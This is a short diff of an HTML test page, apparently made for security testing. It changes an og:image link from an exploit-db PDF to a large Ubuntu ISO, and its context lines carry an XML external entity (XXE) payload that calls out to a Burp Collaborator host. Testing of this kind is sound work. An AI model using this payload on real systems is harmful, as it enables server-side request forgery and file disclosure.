@@ -4,7 +4,7 @@
  <!ENTITY xxe SYSTEM "http://z666e2x8n3hh8kqinsrzb1l8ezkq8f.burpcollaborator.net" >]><foo>&xxe;</foo>
 <html>
 	<head>
-		<meta property="og:image" content="https://www.exploit-db.com/docs/english/44319-web-application-security-testing.pdf" />
+		<meta property="og:image" content="http://mirror.as29550.net/releases.ubuntu.com/18.04.3/ubuntu-18.04.3-desktop-amd64.iso" />
 	</head>
 	<body>
 		<h1>My First Heading</h1>
